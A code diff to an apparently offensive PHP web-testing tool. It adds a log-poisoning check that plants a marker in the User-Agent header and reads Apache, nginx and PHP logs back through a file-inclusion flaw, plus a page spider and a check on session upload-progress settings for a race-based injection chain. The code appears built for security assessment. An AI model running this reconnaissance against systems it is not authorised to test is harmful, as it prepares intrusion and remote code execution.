@@ -66,6 +66,19 @@ TRAVERSAL_DEPTHS = [
     "../../../../../../../../",
 ]
 
+LOG_PATHS: List[str] = [
+    "/var/log/apache2/access.log",
+    "/var/log/apache2/error.log",
+    "/var/log/httpd/access_log",
+    "/var/log/httpd/error_log",
+    "/var/log/nginx/access.log",
+    "/var/log/nginx/error.log",
+    "/proc/self/fd/2",
+    "/tmp/php_errors.log",
+    "/var/log/php-fpm.log",
+    "/var/log/php_errors.log",
+]
+
 _PHPINFO_DETECT = re.compile(
     r"<title>phpinfo\(\)</title>|PHP Version \d|phpinfo\(\)", re.I
 )
@@ -76,6 +89,8 @@ _PHPINFO_DIRECTIVE = re.compile(
 _PASSWD_DETECT = re.compile(r"root:[x*]:0:0:")
 _WININI_DETECT = re.compile(r"\[(fonts|extensions)\]", re.I)
 _HREF_RE = re.compile(r'href=["\']([^"\']{1,500})["\']', re.I)
+_ACTION_RE = re.compile(r'action=["\']([^"\']{1,500})["\']', re.I)
+_SRC_RE = re.compile(r'src=["\']([^"\']{1,500})["\']', re.I)
 
 # Framework detection patterns
 _FRAMEWORK_SIGNATURES: List[Tuple[str, str, str]] = [
@@ -112,8 +127,30 @@ class PhpInfoResult:
     php_version: Optional[str] = None
     sapi: Optional[str] = None
     document_root: Optional[str] = None
+    upload_progress_enabled: Optional[bool] = None
+    upload_progress_cleanup: Optional[bool] = None
     raw_directives: Dict[str, str] = field(default_factory=dict)
     evidence_refs: List[str] = field(default_factory=list)
+
+    def memory_limit_bytes(self) -> Optional[int]:
+        """Parse memory_limit into bytes.  Returns None if unknown."""
+        if not self.memory_limit:
+            return None
+        val = self.memory_limit.strip()
+        if val == "-1":
+            return -1
+        m = re.match(r"^(\d+)\s*([KMG]?)$", val, re.I)
+        if not m:
+            return None
+        n = int(m.group(1))
+        suffix = m.group(2).upper()
+        if suffix == "K":
+            return n * 1024
+        if suffix == "M":
+            return n * 1024 * 1024
+        if suffix == "G":
+            return n * 1024 * 1024 * 1024
+        return n
 
     def to_dict(self) -> Dict[str, Any]:
         return {
@@ -121,12 +158,15 @@ class PhpInfoResult:
             "url": self.url,
             "session_save_path": self.session_save_path,
             "memory_limit": self.memory_limit,
+            "memory_limit_bytes": self.memory_limit_bytes(),
             "disable_functions": list(self.disable_functions),
             "open_basedir": self.open_basedir,
             "allow_url_include": self.allow_url_include,
             "allow_url_fopen": self.allow_url_fopen,
             "php_version": self.php_version,
             "sapi": self.sapi,
+            "upload_progress_enabled": self.upload_progress_enabled,
+            "upload_progress_cleanup": self.upload_progress_cleanup,
             "evidence_refs": list(self.evidence_refs),
         }
 
@@ -154,8 +194,9 @@ class LfiEndpoint:
             payload = file_path
         qs = parse_qs(parsed.query, keep_blank_values=True)
         qs[self.param] = [payload]
+        from urllib.parse import quote as _q
         query = "&".join(
-            f"{k}={v[0]}" for k, v in qs.items()
+            f"{_q(k, safe='')}={_q(v[0], safe='')}" for k, v in qs.items()
         )
         return f"{base}?{query}"
 
@@ -179,8 +220,11 @@ class DiscoverResult:
     wrapper_works: Optional[str] = None
     framework: Optional[str] = None
     framework_version: Optional[str] = None
+    log_poisoning_path: Optional[str] = None
+    log_poisoning_log: Optional[str] = None
     discovered_pages: List[str] = field(default_factory=list)
     discovered_params: Dict[str, List[str]] = field(default_factory=dict)
+    crawled_pages: List[str] = field(default_factory=list)
     evidence_refs: List[str] = field(default_factory=list)
     notes: List[str] = field(default_factory=list)
     errors: List[str] = field(default_factory=list)
@@ -202,6 +246,10 @@ class DiscoverResult:
     def wrapper_ready(self) -> bool:
         return self.wrapper_works is not None
 
+    @property
+    def log_poison_ready(self) -> bool:
+        return self.has_lfi and self.log_poisoning_path is not None
+
     def best_lfi(self) -> Optional[LfiEndpoint]:
         if not self.lfi_endpoints:
             return None
@@ -219,7 +267,10 @@ class DiscoverResult:
             "allow_url_include": self.allow_url_include,
             "wrapper_works": self.wrapper_works,
             "framework": self.framework,
+            "log_poisoning_path": self.log_poisoning_path,
+            "log_poisoning_log": self.log_poisoning_log,
             "discovered_pages": list(self.discovered_pages),
+            "crawled_pages": list(self.crawled_pages),
             "notes": list(self.notes),
             "errors": list(self.errors),
             "requests_used": self.requests_used,
@@ -404,6 +455,13 @@ def discover_phpinfo(
 
         auf = directives.get("allow_url_fopen", "").lower()
         result.allow_url_fopen = auf in ("on", "1")
+
+        upe = directives.get("session.upload_progress.enabled", "").lower()
+        if upe:
+            result.upload_progress_enabled = upe in ("on", "1")
+        upc = directives.get("session.upload_progress.cleanup", "").lower()
+        if upc:
+            result.upload_progress_cleanup = upc in ("on", "1")
 
         version_match = re.search(r"PHP Version\s+(\d+\.\d+\.\d+\S*)", body)
         if version_match:
@@ -862,6 +920,130 @@ def test_php_wrappers(
 
 
 # ---------------------------------------------------------------------------
+# Phase 5b: log poisoning test
+# ---------------------------------------------------------------------------
+
+
+_LOG_MARKER_RE = re.compile(r"P2SLOGTEST[A-Z0-9]{8}")
+
+
+def discover_log_poisoning(
+    client: HttpClient,
+    profile: TargetProfile,
+    store: Any,
+    budget: DiscoverBudget,
+    lfi: LfiEndpoint,
+    timeout: float = 8.0,
+) -> Tuple[Optional[str], Optional[str]]:
+    """Test if any known log file is includable via the LFI.
+
+    Injects a unique marker in the User-Agent header, then reads each
+    candidate log path through the LFI.  Returns (log_path, evidence_ref)
+    on success.
+    """
+    marker = f"P2SLOGTEST{new_nonce('P2S')[-8:]}"
+    ua_with_marker = f"Mozilla/5.0 {marker}"
+
+    _safe_get(
+        client, profile.base_url, store, budget,
+        scenario_id="discover-log-poison-inject",
+        timeout=timeout,
+        notes="log poison: inject marker via User-Agent",
+        extra_headers={"User-Agent": ua_with_marker},
+    )
+
+    for log_path in LOG_PATHS:
+        if not budget.can_spend():
+            break
+        include_url = lfi.build_include_url(log_path)
+        pair = _safe_get(
+            client, include_url, store, budget,
+            scenario_id="discover-log-poison-read",
+            timeout=timeout,
+            notes=f"log poison: read {log_path}",
+        )
+        if pair is None:
+            continue
+        exchange, item = pair
+        body = _body_text(exchange)
+        if marker in body:
+            return log_path, item.id
+
+    return None, None
+
+
+# ---------------------------------------------------------------------------
+# Phase 5c: basic spider (one level deep)
+# ---------------------------------------------------------------------------
+
+
+def _extract_all_links(base_url: str, html: str) -> List[str]:
+    """Extract local PHP links from HTML for crawling."""
+    results: List[str] = []
+    seen: Set[str] = set()
+    parsed_base = urlsplit(base_url)
+
+    for regex in (_HREF_RE, _ACTION_RE, _SRC_RE):
+        for match in regex.finditer(html):
+            href = match.group(1).strip()
+            if href.startswith(("javascript:", "mailto:", "#", "data:")):
+                continue
+
+            if href.startswith(("http://", "https://", "//")):
+                parsed_href = urlsplit(href)
+                if parsed_href.netloc and parsed_href.netloc != parsed_base.netloc:
+                    continue
+                path = parsed_href.path
+            else:
+                path = href.split("?")[0].split("#")[0]
+
+            if not path or not path.endswith(".php"):
+                continue
+            if path in seen:
+                continue
+            seen.add(path)
+            results.append(path)
+
+    return results
+
+
+def spider_pages(
+    client: HttpClient,
+    profile: TargetProfile,
+    store: Any,
+    budget: DiscoverBudget,
+    homepage_body: str,
+    timeout: float = 8.0,
+    max_pages: int = 15,
+) -> List[Tuple[str, str]]:
+    """Crawl one level deep from the homepage to find PHP pages with params.
+
+    Returns list of (page_path, body) tuples.
+    """
+    results: List[Tuple[str, str]] = []
+    links = _extract_all_links(profile.base_url, homepage_body)
+
+    for link in links[:max_pages]:
+        if not budget.can_spend():
+            break
+        url = _full_url(profile.base_url, link)
+        pair = _safe_get(
+            client, url, store, budget,
+            scenario_id="discover-spider",
+            timeout=timeout,
+            notes=f"spider: {link}",
+        )
+        if pair is None:
+            continue
+        exchange, item = pair
+        if exchange.status and 200 <= exchange.status < 400:
+            body = _body_text(exchange)
+            results.append((link, body))
+
+    return results
+
+
+# ---------------------------------------------------------------------------
 # Phase 6: framework detection
 # ---------------------------------------------------------------------------
 
@@ -949,6 +1131,29 @@ def run_discovery(
     else:
         _log("phpinfo not found at common paths")
 
+    # --- Phase 1b: spider one level deep ---
+    if budget.can_spend(2):
+        _log("phase 1b: spidering for PHP pages")
+        crawled = spider_pages(
+            client, profile, store, budget, homepage_body, timeout,
+        )
+        result.crawled_pages = [p for p, _ in crawled]
+        if crawled:
+            _log(f"  found {len(crawled)} additional pages")
+            for page_path, page_body in crawled:
+                page_links = _extract_links(profile.base_url, page_body)
+                for _, params in page_links:
+                    for pname in params:
+                        if pname not in result.discovered_params.get(page_path, []):
+                            result.discovered_params.setdefault(page_path, []).append(pname)
+
+    # --- Phase 1c: upload_progress.cleanup warning ---
+    if result.phpinfo.found:
+        if result.phpinfo.upload_progress_cleanup is True:
+            _log("  ! session.upload_progress.cleanup=On — race window is narrow for chain A")
+        if result.phpinfo.upload_progress_enabled is False:
+            _log("  ! session.upload_progress.enabled=Off — session injection will not work")
+
     # --- Phase 2: LFI discovery ---
     _log("phase 2: scanning for LFI")
     lfi_endpoints = discover_lfi(
@@ -1002,6 +1207,24 @@ def run_discovery(
     elif not result.wrapper_works:
         result.session_path = "/tmp/sess_"
         result.session_path_source = "default"
+
+    # --- Phase 5: log poisoning discovery ---
+    if lfi_endpoints and not result.wrapper_works and budget.can_spend(2):
+        best_lfi = lfi_endpoints[0]
+        _log("phase 5: testing log poisoning via LFI")
+        log_path, log_ref = discover_log_poisoning(
+            client, profile, store, budget, best_lfi, timeout,
+        )
+        if log_path:
+            result.log_poisoning_path = log_path
+            result.log_poisoning_log = log_path
+            if log_ref:
+                result.evidence_refs.append(log_ref)
+            _log(f"log poisoning confirmed: {log_path}")
+        else:
+            _log("no readable log files found via LFI")
+    elif lfi_endpoints and result.wrapper_works:
+        _log("phase 5: skipped (wrapper execution available, log poisoning unnecessary)")
 
     result.allow_url_include = result.phpinfo.allow_url_include
     result.requests_used = budget.used
